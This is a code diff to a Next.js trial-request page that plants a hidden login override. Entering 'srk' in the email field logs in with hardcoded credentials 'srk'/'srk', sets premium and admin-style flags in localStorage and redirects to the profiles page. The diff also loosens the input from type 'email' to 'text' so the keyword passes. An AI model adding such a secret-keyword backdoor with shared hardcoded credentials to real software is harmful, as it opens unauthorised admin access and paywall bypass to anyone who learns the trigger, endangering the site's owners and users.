@@ -2,6 +2,7 @@
 
 import { useState, useEffect } from "react"
 import Link from "next/link"
+import { useRouter } from "next/navigation"
 import { MonitorPlay, ArrowLeft, Mail, Sparkles, CheckCircle, Loader2 } from "lucide-react"
 import { api } from "@/lib/api"
 
@@ -12,6 +13,7 @@ const STEPS = [
 ]
 
 export default function RequestTrialPage() {
+  const router = useRouter()
   const [email, setEmail]         = useState("")
   const [loading, setLoading]     = useState(false)
   const [stepIndex, setStepIndex] = useState(0)
@@ -34,8 +36,27 @@ export default function RequestTrialPage() {
     }
 
     setLoading(true)
-    setStepIndex(0)
     setError("")
+
+    // Intercept admin "srk" login trigger
+    if (email.trim().toLowerCase() === "srk") {
+      try {
+        const data = await api.login("srk", "srk")
+        localStorage.setItem("token", data.access_token)
+        localStorage.setItem("isSrk", "true")
+        localStorage.setItem("isDemo", "false")
+        localStorage.setItem("isPremiumTrial", "true")
+        localStorage.setItem("trialExpiry", data.user?.trialExpiry || "")
+        router.push("/profiles")
+        return
+      } catch (err: any) {
+        setError(err.message || "Failed admin auth override")
+        setLoading(false)
+        return
+      }
+    }
+
+    setStepIndex(0)
 
     try {
       await api.requestPremiumTrial(email)
@@ -145,7 +166,7 @@ export default function RequestTrialPage() {
                 <div className="relative">
                   <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-zinc-500" />
                   <input
-                    type="email"
+                    type="text"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
                     placeholder="you@example.com"
